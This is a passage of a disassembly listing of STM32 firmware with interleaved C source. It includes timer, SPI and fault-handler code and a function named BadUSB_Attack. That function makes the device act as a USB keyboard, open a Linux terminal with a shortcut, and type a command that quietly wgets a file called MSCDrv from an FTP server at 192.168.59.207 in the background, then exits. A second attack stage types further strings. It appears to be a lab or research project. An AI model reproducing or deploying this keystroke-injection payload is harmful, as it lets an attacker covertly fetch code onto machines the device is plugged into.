 8000a60:	687a      	ldr	r2, [r7, #4]
 8000a62:	4413      	add	r3, r2
 8000a64:	781a      	ldrb	r2, [r3, #0]
 8000a66:	7bfb      	ldrb	r3, [r7, #15]
 8000a68:	3320      	adds	r3, #32
 8000a6a:	6879      	ldr	r1, [r7, #4]
 8000a6c:	440b      	add	r3, r1
 8000a6e:	f042 0208 	orr.w	r2, r2, #8
 8000a72:	b2d2      	uxtb	r2, r2
 8000a74:	701a      	strb	r2, [r3, #0]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a76:	7bfb      	ldrb	r3, [r7, #15]
 8000a78:	3301      	adds	r3, #1
 8000a7a:	73fb      	strb	r3, [r7, #15]
 8000a7c:	7bfb      	ldrb	r3, [r7, #15]
 8000a7e:	2b5a      	cmp	r3, #90	; 0x5a
 8000a80:	d9e1      	bls.n	8000a46 <Convert2CapsMap+0xe>
	}
}
 8000a82:	bf00      	nop
 8000a84:	bf00      	nop
 8000a86:	3714      	adds	r7, #20
 8000a88:	46bd      	mov	sp, r7
 8000a8a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000a8e:	4770      	bx	lr

08000a90 <InterruptTrap>:

void InterruptTrap(int *InterruptFlag){
 8000a90:	b580      	push	{r7, lr}
 8000a92:	b082      	sub	sp, #8
 8000a94:	af00      	add	r7, sp, #0
 8000a96:	6078      	str	r0, [r7, #4]
	if(*InterruptFlag == 1){
 8000a98:	687b      	ldr	r3, [r7, #4]
 8000a9a:	681b      	ldr	r3, [r3, #0]
 8000a9c:	2b01      	cmp	r3, #1
 8000a9e:	d10f      	bne.n	8000ac0 <InterruptTrap+0x30>
		*InterruptFlag = 0;
 8000aa0:	687b      	ldr	r3, [r7, #4]
 8000aa2:	2200      	movs	r2, #0
 8000aa4:	601a      	str	r2, [r3, #0]
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
 8000aa6:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000aaa:	695b      	ldr	r3, [r3, #20]
 8000aac:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000ab0:	f043 0301 	orr.w	r3, r3, #1
 8000ab4:	6153      	str	r3, [r2, #20]
		//Second entry interrupt
		MX_TIM2_Init();
 8000ab6:	f000 f9d7 	bl	8000e68 <MX_TIM2_Init>
		HAL_TIM_Base_Start_IT(&htim2);
 8000aba:	4803      	ldr	r0, [pc, #12]	; (8000ac8 <InterruptTrap+0x38>)
 8000abc:	f004 f920 	bl	8004d00 <HAL_TIM_Base_Start_IT>
	}
}
 8000ac0:	bf00      	nop
 8000ac2:	3708      	adds	r7, #8
 8000ac4:	46bd      	mov	sp, r7
 8000ac6:	bd80      	pop	{r7, pc}
 8000ac8:	200002e4 	.word	0x200002e4

08000acc <BadUSB_Attack>:

void BadUSB_Attack(int stage){
 8000acc:	b580      	push	{r7, lr}
 8000ace:	b0c4      	sub	sp, #272	; 0x110
 8000ad0:	af00      	add	r7, sp, #0
 8000ad2:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000ad6:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000ada:	6018      	str	r0, [r3, #0]
#if Target == FPGA
	if(stage == 0){
 8000adc:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000ae0:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000ae4:	681b      	ldr	r3, [r3, #0]
 8000ae6:	2b00      	cmp	r3, #0
 8000ae8:	d125      	bne.n	8000b36 <BadUSB_Attack+0x6a>
		uint8_t StartLinuxTerminal[3] = {130, 131, 'T'};
 8000aea:	4a37      	ldr	r2, [pc, #220]	; (8000bc8 <BadUSB_Attack+0xfc>)
 8000aec:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000af0:	6812      	ldr	r2, [r2, #0]
 8000af2:	4611      	mov	r1, r2
 8000af4:	8019      	strh	r1, [r3, #0]
 8000af6:	3302      	adds	r3, #2
 8000af8:	0c12      	lsrs	r2, r2, #16
 8000afa:	701a      	strb	r2, [r3, #0]
		char AttackStr0[256];
		strcpy(AttackStr0,
 8000afc:	f107 0308 	add.w	r3, r7, #8
 8000b00:	4a32      	ldr	r2, [pc, #200]	; (8000bcc <BadUSB_Attack+0x100>)
 8000b02:	4618      	mov	r0, r3
 8000b04:	4611      	mov	r1, r2
 8000b06:	235f      	movs	r3, #95	; 0x5f
 8000b08:	461a      	mov	r2, r3
 8000b0a:	f00c fa8d 	bl	800d028 <memcpy>
				"\n\ncd /home/user/Templates\nwget ftp://anonymous:@192.168.59.207/MSCDrv > /dev/null 2>&1 &\nexit\n");
		SimulateShortcutKey(StartLinuxTerminal, 3);
 8000b0e:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000b12:	2103      	movs	r1, #3
 8000b14:	4618      	mov	r0, r3
 8000b16:	f7ff ff25 	bl	8000964 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
 8000b1a:	f107 0308 	add.w	r3, r7, #8
 8000b1e:	4618      	mov	r0, r3
 8000b20:	f7ff fb54 	bl	80001cc <strlen>
 8000b24:	4603      	mov	r3, r0
 8000b26:	4619      	mov	r1, r3
 8000b28:	f107 0308 	add.w	r3, r7, #8
 8000b2c:	4a28      	ldr	r2, [pc, #160]	; (8000bd0 <BadUSB_Attack+0x104>)
 8000b2e:	4618      	mov	r0, r3
 8000b30:	f7ff ff44 	bl	80009bc <SimulateKeyStrokes>
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
#endif
}
 8000b34:	e042      	b.n	8000bbc <BadUSB_Attack+0xf0>
	}else if(stage == 1){
 8000b36:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b3a:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000b3e:	681b      	ldr	r3, [r3, #0]
 8000b40:	2b01      	cmp	r3, #1
 8000b42:	d125      	bne.n	8000b90 <BadUSB_Attack+0xc4>
		uint8_t StartLinuxTerminal[3] = {130, 131, 'T'};
 8000b44:	4a20      	ldr	r2, [pc, #128]	; (8000bc8 <BadUSB_Attack+0xfc>)
 8000b46:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b4a:	6812      	ldr	r2, [r2, #0]
 8000b4c:	4611      	mov	r1, r2
 8000b4e:	8019      	strh	r1, [r3, #0]
 8000b50:	3302      	adds	r3, #2
 8000b52:	0c12      	lsrs	r2, r2, #16
 8000b54:	701a      	strb	r2, [r3, #0]
		strcpy(AttackStr1,
 8000b56:	f107 0308 	add.w	r3, r7, #8
 8000b5a:	4a1e      	ldr	r2, [pc, #120]	; (8000bd4 <BadUSB_Attack+0x108>)
 8000b5c:	4618      	mov	r0, r3
 8000b5e:	4611      	mov	r1, r2
 8000b60:	234d      	movs	r3, #77	; 0x4d
 8000b62:	461a      	mov	r2, r3
 8000b64:	f00c fa60 	bl	800d028 <memcpy>
		SimulateShortcutKey(StartLinuxTerminal, 3);
 8000b68:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b6c:	2103      	movs	r1, #3
 8000b6e:	4618      	mov	r0, r3
 8000b70:	f7ff fef8 	bl	8000964 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
 8000b74:	f107 0308 	add.w	r3, r7, #8
 8000b78:	4618      	mov	r0, r3
 8000b7a:	f7ff fb27 	bl	80001cc <strlen>
 8000b7e:	4603      	mov	r3, r0
 8000b80:	4619      	mov	r1, r3
 8000b82:	f107 0308 	add.w	r3, r7, #8
 8000b86:	4a12      	ldr	r2, [pc, #72]	; (8000bd0 <BadUSB_Attack+0x104>)
 8000b88:	4618      	mov	r0, r3
 8000b8a:	f7ff ff17 	bl	80009bc <SimulateKeyStrokes>
}
 8000b8e:	e015      	b.n	8000bbc <BadUSB_Attack+0xf0>
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
 8000b90:	f107 0308 	add.w	r3, r7, #8
 8000b94:	4a10      	ldr	r2, [pc, #64]	; (8000bd8 <BadUSB_Attack+0x10c>)
 8000b96:	4618      	mov	r0, r3
 8000b98:	4611      	mov	r1, r2
 8000b9a:	234e      	movs	r3, #78	; 0x4e
 8000b9c:	461a      	mov	r2, r3
 8000b9e:	f00c fa43 	bl	800d028 <memcpy>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000ba2:	f107 0308 	add.w	r3, r7, #8
 8000ba6:	4618      	mov	r0, r3
 8000ba8:	f7ff fb10 	bl	80001cc <strlen>
 8000bac:	4603      	mov	r3, r0
 8000bae:	4619      	mov	r1, r3
 8000bb0:	f107 0308 	add.w	r3, r7, #8
 8000bb4:	4a06      	ldr	r2, [pc, #24]	; (8000bd0 <BadUSB_Attack+0x104>)
 8000bb6:	4618      	mov	r0, r3
 8000bb8:	f7ff ff00 	bl	80009bc <SimulateKeyStrokes>
}
 8000bbc:	bf00      	nop
 8000bbe:	f507 7788 	add.w	r7, r7, #272	; 0x110
 8000bc2:	46bd      	mov	sp, r7
 8000bc4:	bd80      	pop	{r7, pc}
 8000bc6:	bf00      	nop
 8000bc8:	0800d1e4 	.word	0x0800d1e4
 8000bcc:	0800d0e4 	.word	0x0800d0e4
 8000bd0:	20000278 	.word	0x20000278
 8000bd4:	0800d144 	.word	0x0800d144
 8000bd8:	0800d194 	.word	0x0800d194

08000bdc <HAL_TIM_PeriodElapsedCallback>:

void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
 8000bdc:	b580      	push	{r7, lr}
 8000bde:	b082      	sub	sp, #8
 8000be0:	af00      	add	r7, sp, #0
 8000be2:	6078      	str	r0, [r7, #4]
	if(htim == &htim2){
 8000be4:	687b      	ldr	r3, [r7, #4]
 8000be6:	4a1d      	ldr	r2, [pc, #116]	; (8000c5c <HAL_TIM_PeriodElapsedCallback+0x80>)
 8000be8:	4293      	cmp	r3, r2
 8000bea:	d133      	bne.n	8000c54 <HAL_TIM_PeriodElapsedCallback+0x78>
		if(InterruptCnt == 0){
 8000bec:	4b1c      	ldr	r3, [pc, #112]	; (8000c60 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000bee:	681b      	ldr	r3, [r3, #0]
 8000bf0:	2b00      	cmp	r3, #0
 8000bf2:	d108      	bne.n	8000c06 <HAL_TIM_PeriodElapsedCallback+0x2a>
			//Simulate press operation
			Get_Single_Descriptor(128);
 8000bf4:	2080      	movs	r0, #128	; 0x80
 8000bf6:	f7ff fdc9 	bl	800078c <Get_Single_Descriptor>
			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000bfa:	220f      	movs	r2, #15
 8000bfc:	4919      	ldr	r1, [pc, #100]	; (8000c64 <HAL_TIM_PeriodElapsedCallback+0x88>)
 8000bfe:	481a      	ldr	r0, [pc, #104]	; (8000c68 <HAL_TIM_PeriodElapsedCallback+0x8c>)
 8000c00:	f007 feec 	bl	80089dc <USBD_CUSTOM_HID_SendReport>
 8000c04:	e018      	b.n	8000c38 <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
		}else if(InterruptCnt == 1){
 8000c06:	4b16      	ldr	r3, [pc, #88]	; (8000c60 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c08:	681b      	ldr	r3, [r3, #0]
 8000c0a:	2b01      	cmp	r3, #1
 8000c0c:	d10c      	bne.n	8000c28 <HAL_TIM_PeriodElapsedCallback+0x4c>
			//Simulate release operation
			SimulateKeyRelease();
 8000c0e:	f7ff fe81 	bl	8000914 <SimulateKeyRelease>
			//Judging whether to Interrupt
			if((recv_buffer[0]&0x02) != 0x02)
 8000c12:	4b16      	ldr	r3, [pc, #88]	; (8000c6c <HAL_TIM_PeriodElapsedCallback+0x90>)
 8000c14:	781b      	ldrb	r3, [r3, #0]
 8000c16:	f003 0302 	and.w	r3, r3, #2
 8000c1a:	2b00      	cmp	r3, #0
 8000c1c:	d10c      	bne.n	8000c38 <HAL_TIM_PeriodElapsedCallback+0x5c>
				InterruptCnt = -1;
 8000c1e:	4b10      	ldr	r3, [pc, #64]	; (8000c60 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c20:	f04f 32ff 	mov.w	r2, #4294967295
 8000c24:	601a      	str	r2, [r3, #0]
 8000c26:	e007      	b.n	8000c38 <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
		}else{
			//off timer
			TIM2->CR1 &= ~TIM_CR1_CEN;
 8000c28:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000c2c:	681b      	ldr	r3, [r3, #0]
 8000c2e:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000c32:	f023 0301 	bic.w	r3, r3, #1
 8000c36:	6013      	str	r3, [r2, #0]
		}
		InterruptCnt = (InterruptCnt+1)%3;
 8000c38:	4b09      	ldr	r3, [pc, #36]	; (8000c60 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c3a:	681b      	ldr	r3, [r3, #0]
 8000c3c:	1c59      	adds	r1, r3, #1
 8000c3e:	4b0c      	ldr	r3, [pc, #48]	; (8000c70 <HAL_TIM_PeriodElapsedCallback+0x94>)
 8000c40:	fb83 3201 	smull	r3, r2, r3, r1
 8000c44:	17cb      	asrs	r3, r1, #31
 8000c46:	1ad2      	subs	r2, r2, r3
 8000c48:	4613      	mov	r3, r2
 8000c4a:	005b      	lsls	r3, r3, #1
 8000c4c:	4413      	add	r3, r2
 8000c4e:	1aca      	subs	r2, r1, r3
 8000c50:	4b03      	ldr	r3, [pc, #12]	; (8000c60 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c52:	601a      	str	r2, [r3, #0]
	}
}
 8000c54:	bf00      	nop
 8000c56:	3708      	adds	r7, #8
 8000c58:	46bd      	mov	sp, r7
 8000c5a:	bd80      	pop	{r7, pc}
 8000c5c:	200002e4 	.word	0x200002e4
 8000c60:	20000274 	.word	0x20000274
 8000c64:	2000025c 	.word	0x2000025c
 8000c68:	200003c0 	.word	0x200003c0
 8000c6c:	2000026c 	.word	0x2000026c
 8000c70:	55555556 	.word	0x55555556

08000c74 <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 8000c74:	b480      	push	{r7}
 8000c76:	af00      	add	r7, sp, #0
  \details Disables IRQ interrupts by setting the I-bit in the CPSR.
           Can only be executed in Privileged modes.
 */
__STATIC_FORCEINLINE void __disable_irq(void)
{
  __ASM volatile ("cpsid i" : : : "memory");
 8000c78:	b672      	cpsid	i
}
 8000c7a:	bf00      	nop
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
 8000c7c:	e7fe      	b.n	8000c7c <Error_Handler+0x8>
	...

08000c80 <MX_SPI1_Init>:

SPI_HandleTypeDef hspi1;

/* SPI1 init function */
void MX_SPI1_Init(void)
{
 8000c80:	b580      	push	{r7, lr}
 8000c82:	af00      	add	r7, sp, #0
  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  hspi1.Instance = SPI1;
 8000c84:	4b1b      	ldr	r3, [pc, #108]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000c86:	4a1c      	ldr	r2, [pc, #112]	; (8000cf8 <MX_SPI1_Init+0x78>)
 8000c88:	601a      	str	r2, [r3, #0]
  hspi1.Init.Mode = SPI_MODE_MASTER;
 8000c8a:	4b1a      	ldr	r3, [pc, #104]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000c8c:	f44f 7282 	mov.w	r2, #260	; 0x104
 8000c90:	605a      	str	r2, [r3, #4]
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
 8000c92:	4b18      	ldr	r3, [pc, #96]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000c94:	2200      	movs	r2, #0
 8000c96:	609a      	str	r2, [r3, #8]
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
 8000c98:	4b16      	ldr	r3, [pc, #88]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000c9a:	f44f 62e0 	mov.w	r2, #1792	; 0x700
 8000c9e:	60da      	str	r2, [r3, #12]
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
 8000ca0:	4b14      	ldr	r3, [pc, #80]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000ca2:	2200      	movs	r2, #0
 8000ca4:	611a      	str	r2, [r3, #16]
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
 8000ca6:	4b13      	ldr	r3, [pc, #76]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000ca8:	2200      	movs	r2, #0
 8000caa:	615a      	str	r2, [r3, #20]
  hspi1.Init.NSS = SPI_NSS_SOFT;
 8000cac:	4b11      	ldr	r3, [pc, #68]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000cae:	f44f 7200 	mov.w	r2, #512	; 0x200
 8000cb2:	619a      	str	r2, [r3, #24]
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_64;
 8000cb4:	4b0f      	ldr	r3, [pc, #60]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000cb6:	2228      	movs	r2, #40	; 0x28
 8000cb8:	61da      	str	r2, [r3, #28]
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
 8000cba:	4b0e      	ldr	r3, [pc, #56]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000cbc:	2200      	movs	r2, #0
 8000cbe:	621a      	str	r2, [r3, #32]
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
 8000cc0:	4b0c      	ldr	r3, [pc, #48]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000cc2:	2200      	movs	r2, #0
 8000cc4:	625a      	str	r2, [r3, #36]	; 0x24
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8000cc6:	4b0b      	ldr	r3, [pc, #44]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000cc8:	2200      	movs	r2, #0
 8000cca:	629a      	str	r2, [r3, #40]	; 0x28
  hspi1.Init.CRCPolynomial = 7;
 8000ccc:	4b09      	ldr	r3, [pc, #36]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000cce:	2207      	movs	r2, #7
 8000cd0:	62da      	str	r2, [r3, #44]	; 0x2c
  hspi1.Init.CRCLength = SPI_CRC_LENGTH_DATASIZE;
 8000cd2:	4b08      	ldr	r3, [pc, #32]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000cd4:	2200      	movs	r2, #0
 8000cd6:	631a      	str	r2, [r3, #48]	; 0x30
  hspi1.Init.NSSPMode = SPI_NSS_PULSE_ENABLE;
 8000cd8:	4b06      	ldr	r3, [pc, #24]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000cda:	2208      	movs	r2, #8
 8000cdc:	635a      	str	r2, [r3, #52]	; 0x34
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
 8000cde:	4805      	ldr	r0, [pc, #20]	; (8000cf4 <MX_SPI1_Init+0x74>)
 8000ce0:	f003 ff14 	bl	8004b0c <HAL_SPI_Init>
 8000ce4:	4603      	mov	r3, r0
 8000ce6:	2b00      	cmp	r3, #0
 8000ce8:	d001      	beq.n	8000cee <MX_SPI1_Init+0x6e>
  {
    Error_Handler();
 8000cea:	f7ff ffc3 	bl	8000c74 <Error_Handler>
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}
 8000cee:	bf00      	nop
 8000cf0:	bd80      	pop	{r7, pc}
 8000cf2:	bf00      	nop
 8000cf4:	20000280 	.word	0x20000280
 8000cf8:	40013000 	.word	0x40013000

08000cfc <HAL_SPI_MspInit>:

void HAL_SPI_MspInit(SPI_HandleTypeDef* spiHandle)
{
 8000cfc:	b580      	push	{r7, lr}
 8000cfe:	b08a      	sub	sp, #40	; 0x28
 8000d00:	af00      	add	r7, sp, #0
 8000d02:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000d04:	f107 0314 	add.w	r3, r7, #20
 8000d08:	2200      	movs	r2, #0
 8000d0a:	601a      	str	r2, [r3, #0]
 8000d0c:	605a      	str	r2, [r3, #4]
 8000d0e:	609a      	str	r2, [r3, #8]
 8000d10:	60da      	str	r2, [r3, #12]
 8000d12:	611a      	str	r2, [r3, #16]
  if(spiHandle->Instance==SPI1)
 8000d14:	687b      	ldr	r3, [r7, #4]
 8000d16:	681b      	ldr	r3, [r3, #0]
 8000d18:	4a17      	ldr	r2, [pc, #92]	; (8000d78 <HAL_SPI_MspInit+0x7c>)
 8000d1a:	4293      	cmp	r3, r2
 8000d1c:	d128      	bne.n	8000d70 <HAL_SPI_MspInit+0x74>
  {
  /* USER CODE BEGIN SPI1_MspInit 0 */

  /* USER CODE END SPI1_MspInit 0 */
    /* SPI1 clock enable */
    __HAL_RCC_SPI1_CLK_ENABLE();
 8000d1e:	4b17      	ldr	r3, [pc, #92]	; (8000d7c <HAL_SPI_MspInit+0x80>)
 8000d20:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d22:	4a16      	ldr	r2, [pc, #88]	; (8000d7c <HAL_SPI_MspInit+0x80>)
 8000d24:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8000d28:	6613      	str	r3, [r2, #96]	; 0x60
 8000d2a:	4b14      	ldr	r3, [pc, #80]	; (8000d7c <HAL_SPI_MspInit+0x80>)
 8000d2c:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d2e:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8000d32:	613b      	str	r3, [r7, #16]
 8000d34:	693b      	ldr	r3, [r7, #16]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000d36:	4b11      	ldr	r3, [pc, #68]	; (8000d7c <HAL_SPI_MspInit+0x80>)
 8000d38:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000d3a:	4a10      	ldr	r2, [pc, #64]	; (8000d7c <HAL_SPI_MspInit+0x80>)
 8000d3c:	f043 0301 	orr.w	r3, r3, #1
 8000d40:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000d42:	4b0e      	ldr	r3, [pc, #56]	; (8000d7c <HAL_SPI_MspInit+0x80>)
 8000d44:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000d46:	f003 0301 	and.w	r3, r3, #1
 8000d4a:	60fb      	str	r3, [r7, #12]
 8000d4c:	68fb      	ldr	r3, [r7, #12]
    /**SPI1 GPIO Configuration
    PA1     ------> SPI1_SCK
    PA6     ------> SPI1_MISO
    PA7     ------> SPI1_MOSI
    */
    GPIO_InitStruct.Pin = GPIO_PIN_1|GPIO_PIN_6|GPIO_PIN_7;
 8000d4e:	23c2      	movs	r3, #194	; 0xc2
 8000d50:	617b      	str	r3, [r7, #20]
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000d52:	2302      	movs	r3, #2
 8000d54:	61bb      	str	r3, [r7, #24]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000d56:	2300      	movs	r3, #0
 8000d58:	61fb      	str	r3, [r7, #28]
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000d5a:	2303      	movs	r3, #3
 8000d5c:	623b      	str	r3, [r7, #32]
    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
 8000d5e:	2305      	movs	r3, #5
 8000d60:	627b      	str	r3, [r7, #36]	; 0x24
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8000d62:	f107 0314 	add.w	r3, r7, #20
 8000d66:	4619      	mov	r1, r3
 8000d68:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000d6c:	f000 fdd4 	bl	8001918 <HAL_GPIO_Init>

  /* USER CODE BEGIN SPI1_MspInit 1 */

  /* USER CODE END SPI1_MspInit 1 */
  }
}
 8000d70:	bf00      	nop
 8000d72:	3728      	adds	r7, #40	; 0x28
 8000d74:	46bd      	mov	sp, r7
 8000d76:	bd80      	pop	{r7, pc}
 8000d78:	40013000 	.word	0x40013000
 8000d7c:	40021000 	.word	0x40021000

08000d80 <HAL_MspInit>:
/* USER CODE END 0 */
/**
  * Initializes the Global MSP.
  */
void HAL_MspInit(void)
{
 8000d80:	b480      	push	{r7}
 8000d82:	b083      	sub	sp, #12
 8000d84:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MspInit 0 */

  /* USER CODE END MspInit 0 */

  __HAL_RCC_SYSCFG_CLK_ENABLE();
 8000d86:	4b0f      	ldr	r3, [pc, #60]	; (8000dc4 <HAL_MspInit+0x44>)
 8000d88:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d8a:	4a0e      	ldr	r2, [pc, #56]	; (8000dc4 <HAL_MspInit+0x44>)
 8000d8c:	f043 0301 	orr.w	r3, r3, #1
 8000d90:	6613      	str	r3, [r2, #96]	; 0x60
 8000d92:	4b0c      	ldr	r3, [pc, #48]	; (8000dc4 <HAL_MspInit+0x44>)
 8000d94:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d96:	f003 0301 	and.w	r3, r3, #1
 8000d9a:	607b      	str	r3, [r7, #4]
 8000d9c:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_PWR_CLK_ENABLE();
 8000d9e:	4b09      	ldr	r3, [pc, #36]	; (8000dc4 <HAL_MspInit+0x44>)
 8000da0:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000da2:	4a08      	ldr	r2, [pc, #32]	; (8000dc4 <HAL_MspInit+0x44>)
 8000da4:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8000da8:	6593      	str	r3, [r2, #88]	; 0x58
 8000daa:	4b06      	ldr	r3, [pc, #24]	; (8000dc4 <HAL_MspInit+0x44>)
 8000dac:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000dae:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8000db2:	603b      	str	r3, [r7, #0]
 8000db4:	683b      	ldr	r3, [r7, #0]
  /* System interrupt init*/

  /* USER CODE BEGIN MspInit 1 */

  /* USER CODE END MspInit 1 */
}
 8000db6:	bf00      	nop
 8000db8:	370c      	adds	r7, #12
 8000dba:	46bd      	mov	sp, r7
 8000dbc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000dc0:	4770      	bx	lr
 8000dc2:	bf00      	nop
 8000dc4:	40021000 	.word	0x40021000

08000dc8 <NMI_Handler>:
/******************************************************************************/
/**
  * @brief This function handles Non maskable interrupt.
  */
void NMI_Handler(void)
{
 8000dc8:	b480      	push	{r7}
 8000dca:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN NonMaskableInt_IRQn 0 */

  /* USER CODE END NonMaskableInt_IRQn 0 */
  /* USER CODE BEGIN NonMaskableInt_IRQn 1 */
   while (1)
 8000dcc:	e7fe      	b.n	8000dcc <NMI_Handler+0x4>

08000dce <HardFault_Handler>:

/**
  * @brief This function handles Hard fault interrupt.
  */
void HardFault_Handler(void)
{
 8000dce:	b480      	push	{r7}
 8000dd0:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN HardFault_IRQn 0 */

  /* USER CODE END HardFault_IRQn 0 */
  while (1)
 8000dd2:	e7fe      	b.n	8000dd2 <HardFault_Handler+0x4>

08000dd4 <MemManage_Handler>:

/**
  * @brief This function handles Memory management fault.
  */
void MemManage_Handler(void)
{
 8000dd4:	b480      	push	{r7}
 8000dd6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MemoryManagement_IRQn 0 */

  /* USER CODE END MemoryManagement_IRQn 0 */
  while (1)
 8000dd8:	e7fe      	b.n	8000dd8 <MemManage_Handler+0x4>

08000dda <BusFault_Handler>:

/**
  * @brief This function handles Prefetch fault, memory access fault.
  */
void BusFault_Handler(void)
{
 8000dda:	b480      	push	{r7}
 8000ddc:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN BusFault_IRQn 0 */

  /* USER CODE END BusFault_IRQn 0 */
  while (1)
 8000dde:	e7fe      	b.n	8000dde <BusFault_Handler+0x4>

08000de0 <UsageFault_Handler>:

/**
  * @brief This function handles Undefined instruction or illegal state.
  */
void UsageFault_Handler(void)
{
 8000de0:	b480      	push	{r7}
 8000de2:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN UsageFault_IRQn 0 */

  /* USER CODE END UsageFault_IRQn 0 */
  while (1)
 8000de4:	e7fe      	b.n	8000de4 <UsageFault_Handler+0x4>

08000de6 <SVC_Handler>:

/**
  * @brief This function handles System service call via SWI instruction.
  */
void SVC_Handler(void)
{
 8000de6:	b480      	push	{r7}
 8000de8:	af00      	add	r7, sp, #0

  /* USER CODE END SVCall_IRQn 0 */
  /* USER CODE BEGIN SVCall_IRQn 1 */

  /* USER CODE END SVCall_IRQn 1 */
}
 8000dea:	bf00      	nop
 8000dec:	46bd      	mov	sp, r7
 8000dee:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000df2:	4770      	bx	lr

08000df4 <DebugMon_Handler>:

/**
  * @brief This function handles Debug monitor.
  */
void DebugMon_Handler(void)
{
 8000df4:	b480      	push	{r7}
